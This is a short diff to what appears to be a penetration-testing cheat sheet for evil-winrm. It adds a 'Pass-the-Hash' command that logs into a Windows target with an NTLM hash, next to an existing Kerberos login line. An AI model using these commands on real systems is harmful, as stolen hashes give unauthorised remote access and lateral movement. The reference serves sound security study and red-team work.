@@ -49,3 +49,7 @@
     domain.tld = DOMAIN.TLD
 
  - evil-winrm -i TARGET_IP -u USERNAME -r DOMAIN -k
+
+#### 4) NTLM Authentication (Pass-the-Hash)
+
+ - evil-winrm -i TARGET_IP -u USER -H NTLM_HASH
